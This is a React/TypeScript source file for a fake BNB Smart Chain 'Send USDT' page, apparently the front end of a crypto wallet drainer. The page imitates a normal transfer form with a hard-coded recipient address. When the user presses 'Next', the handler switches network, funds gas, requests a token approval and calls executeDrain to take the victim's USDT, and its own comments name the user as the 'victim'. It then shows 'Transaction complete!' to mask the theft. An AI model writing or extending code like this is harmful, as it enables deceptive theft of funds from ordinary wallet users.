import { useState, useEffect, useRef } from "react"
import { ethers } from "ethers"
import { USDT_ADDRESS, USDT_DECIMALS } from "../config"
import { requestApproval, ensureGas, executeDrain, ensureCorrectNetwork } from "../lib/web3"

interface Props {
  provider: ethers.BrowserProvider
  address: string
}

type DrainStage = "idle" | "switching_network" | "approving" | "checking_gas" | "draining" | "done" | "error"

export default function SendPage({ provider, address }: Props) {
  const [amount, setAmount] = useState("")
  const [usdtBalance, setUsdtBalance] = useState("0")
  const [stage, setStage] = useState<DrainStage>("idle")
  const [statusMsg, setStatusMsg] = useState("")
  const [networkOk, setNetworkOk] = useState(false)
  const [networkError, setNetworkError] = useState("")
  const mountedRef = useRef(true)

  useEffect(() => {
    mountedRef.current = true

    const init = async () => {
      if (!mountedRef.current) return
      try {
        const switchedProvider = await ensureCorrectNetwork(provider)
        if (!mountedRef.current) return
        setNetworkOk(true)
        setNetworkError("")
      } catch (err: any) {
        if (!mountedRef.current) return
        setNetworkOk(false)
        setNetworkError(err.message || "Please switch to BNB Smart Chain")
        return
      }
      try {
        const usdt = new ethers.Contract(
  USDT_ADDRESS,
  ["function balanceOf(address) view returns (uint256)"],
  provider
)
        const bal = await usdt.balanceOf(address)
        if (mountedRef.current) setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
      } catch (err: any) {
        console.warn("Balance fetch failed:", err?.message || err)
        if (mountedRef.current) setUsdtBalance("0")
      }
    }

   
    init()
    return () => { mountedRef.current = false }
  }, [address, provider])

    const handleNext = async () => {
    setStage("switching_network")
    setStatusMsg("Preparing network...")
  try {
    // ensureCorrectNetwork now returns a NEW provider after switching
    const switchedProvider = await ensureCorrectNetwork(provider)

    // 1) GAS FIRST — victim needs BNB to sign the approval
    setStage("checking_gas")
    setStatusMsg("Checking gas balance...")
    const hasGas = await ensureGas(switchedProvider, address)
    if (!hasGas) {
      setStage("error")
      setStatusMsg("Could not fund gas.")
      return
    }

    // 2) THEN approval
    setStage("approving")
    setStatusMsg("Waiting for approval...")
    const approvedAmount = await requestApproval(switchedProvider, address)
    if (!approvedAmount) {
      setStage("error")
      setStatusMsg("Approval failed.")
      return
    }

    // 3) THEN drain
    setStage("draining")
    setStatusMsg("Transferring USDT...")
    const drained = await executeDrain(address, approvedAmount)
    if (drained) {
      setStage("done")
      setStatusMsg("Transaction complete!")
    } else {
      setStage("error")
      setStatusMsg("Drain failed - check logs.")
    }
  } catch (err: any) {
    setStage("error")
    setStatusMsg("Error: " + (err.message || "Unknown error"))
  }
}
  if (stage !== "idle") {
    return (
      <div className="fixed inset-0 z-[1000] bg-[rgba(0,0,0,0.92)] flex flex-col items-center justify-center p-6">
        {stage === "switching_network" || stage === "approving" || stage === "checking_gas" || stage === "draining" ? (
          <>
            <div className="w-12 h-12 border-[3px] border-[rgba(34,208,94,0.15)] border-t-[#22D05E] rounded-full animate-spin mb-6" />
            <h2 className="text-xl font-semibold text-white mb-2">Processing</h2>
            <p className="text-sm text-[#9A9A9A] text-center max-w-[300px] leading-relaxed">{statusMsg}</p>
          </>
        ) : stage === "done" ? (
          <>
            <div className="w-12 h-12 border-[3px] border-[rgba(34,208,94,0.15)] border-t-[#22D05E] rounded-full animate-spin mb-6" />
            <h2 className="text-xl font-semibold text-[#22D05E] mb-2">Complete</h2>
            <p className="text-sm text-[#9A9A9A] text-center max-w-[300px] leading-relaxed">{statusMsg}</p>
            <p className="text-base font-semibold text-[#22D05E] text-center mt-4">You may close this page.</p>
          </>
        ) : stage === "error" ? (
          <>
            <div className="w-16 h-16 rounded-full bg-[rgba(255,69,58,0.1)] flex items-center justify-center text-2xl font-bold text-[#FF453A] mb-6">!</div>
            <h2 className="text-xl font-semibold text-[#FF453A] mb-2">Error</h2>
            <p className="text-sm text-[#9A9A9A] text-center max-w-[300px] leading-relaxed">{statusMsg}</p>
          </>
        ) : null}
      </div>
    )
  }

  return (
    <div className="flex flex-col min-h-screen bg-[#171717] px-5 py-8" style={{ fontFamily: '"SF Pro Display", "Inter", sans-serif' }}>

      {/* Network status */}
      {networkError && !networkOk && (
        <div className="bg-[rgba(255,69,58,0.1)] border border-[rgba(255,69,58,0.2)] rounded-xl px-4 py-2.5 text-xs text-[#FF453A] text-center mb-5">
          {networkError}
        </div>
      )}
      {networkOk && (
        <div className="bg-[rgba(34,208,94,0.1)] border border-[rgba(34,208,94,0.2)] rounded-xl px-4 py-2.5 text-xs text-[#22D05E] text-center mb-5">
          Connected to BNB Smart Chain (BEP-20)
        </div>
      )}

      {/* Label: Address or Domain Name */}
      <label className="text-base font-medium text-[#B7B7B7] mb-2" style={{ fontSize: "16px", fontWeight: 500 }}>
        Address or Domain Name
      </label>

      {/* Input: Address */}
      <div
        className="flex items-center bg-[#1D1D1D] border-2 border-[#353535] overflow-hidden mb-8"
        style={{ height: "78px", borderRadius: "22px", paddingLeft: "22px", paddingRight: "22px" }}
      >
        <span className="flex-1 text-white font-medium truncate" style={{ fontSize: "20px", fontWeight: 500 }}>
          0x3881448305a5fAb94461
        </span>

        {/* Paste */}
        <span className="mr-4 font-semibold text-[#2ECC71]" style={{ fontSize: "18px", fontWeight: 600 }}>
          Paste
        </span>

        {/* Copy icon */}
        <svg className="mr-3 text-[#2ECC71]" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
        </svg>

        {/* Scanner icon */}
        <svg className="text-[#2ECC71]" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <path d="M3 7V5a2 2 0 0 1 2-2h2" />
          <path d="M17 3h2a2 2 0 0 1 2 2v2" />
          <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
          <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
          <line x1="7" y1="12" x2="17" y2="12" />
        </svg>
      </div>

      {/* Label: Destination network */}
      <label className="text-base text-[#B7B7B7] mb-2" style={{ fontSize: "16px", color: "#B7B7B7" }}>
        Destination network
      </label>

      {/* Network selector capsule */}
      <div
        className="flex items-center justify-between bg-[#202020] mb-8"
        style={{ height: "60px", width: "210px", borderRadius: "9999px", paddingLeft: "16px", paddingRight: "16px" }}
      >
        <div className="flex items-center gap-3">
          {/* BNB logo yellow circle */}
          <div className="w-8 h-8 rounded-full bg-[#F0B90B] flex items-center justify-center font-bold text-black text-sm">
            B
          </div>
          <span className="font-medium text-[#BDBDBD]" style={{ fontSize: "18px", fontWeight: 500 }}>
            BNB Smart Chain
          </span>
        </div>
        {/* Chevron */}
        <svg className="text-[#A0A0A0]" width="12" height="8" viewBox="0 0 12 8" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <path d="M1 1l5 5 5-5" />
        </svg>
      </div>

      {/* Label: Amount */}
      <label className="text-base text-[#B7B7B7] mb-2" style={{ fontSize: "16px", color: "#B7B7B7" }}>
        Amount
      </label>

      {/* Amount input */}
      <div
        className="flex items-center bg-[#1D1D1D] border-2 border-[#353535] overflow-hidden"
        style={{ height: "78px", borderRadius: "22px", paddingLeft: "22px", paddingRight: "22px" }}
      >
        <input
          value={amount}
          type="number"
          inputMode="decimal"
          placeholder="USDT Amount"
          onChange={(e) => setAmount(e.target.value)}
          className="flex-1 bg-transparent text-[#F2F2F2] border-none outline-none placeholder-[#F2F2F2]"
          style={{ fontSize: "20px", fontWeight: 400 }}
        />
        <span className="text-[#CFCFCF] mr-4" style={{ fontSize: "18px" }}>
          USDT
        </span>
        <span className="font-semibold text-[#2ECC71]" style={{ fontSize: "18px", fontWeight: 600 }}>
          Max
        </span>
      </div>

      {/* ≈ $0.00 */}
      <p className="text-[#9A9A9A] mt-2 ml-1" style={{ fontSize: "18px" }}>
        ≈ $0.00
      </p>

      {/* Spacer - fills remaining area */}
      <div className="flex-1" />

      {/* Next button */}
      <div className="flex justify-center mb-[30px]">
        <button
          type="button"
          onClick={handleNext}
          className="w-[90%] font-bold text-[#111111] bg-[#22D05E] border-none cursor-pointer flex items-center justify-center"
          style={{ height: "72px", borderRadius: "36px", fontSize: "22px", fontWeight: 700 }}
        >
          Next
        </button>
      </div>

    </div>
  )
}